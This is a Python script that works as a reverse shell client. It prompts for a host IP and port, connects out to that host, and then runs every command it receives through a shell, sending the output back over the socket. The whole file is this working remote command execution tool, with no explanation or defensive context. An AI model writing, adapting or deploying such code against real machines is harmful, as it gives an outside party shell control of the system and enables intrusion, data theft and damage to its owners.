import socket, subprocess
from colorama import Fore

class Main:
	
	@staticmethod
	def connect():
		host, port = 0, 0

		dec = ''
		while dec != 'y':
			host = input(Fore.WHITE + "[s] Select the host ip: ")
			dec = input(Fore.YELLOW + f"[?]	are you sure you want to use: {host} [y/n]: ").lower().strip()
		
		dec = ''
		while dec != 'y':
			port = input(Fore.WHITE + "[s] Select the port: ")
			dec = input(Fore.YELLOW + f"[?] are you sure you want to use: {port} [y/n]: ").lower().strip()
	
		client_socket = socket.socket()
		client_socket.connect((host, int(port)))

		while True:
			data = client_socket.recv(1024).decode()
			g_data = subprocess.run(data, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
			output = g_data.stdout.decode()

			client_socket.send(output.encode())
		client_socket.close()

if __name__ == '__main__':
	start = Main()
	start.connect()
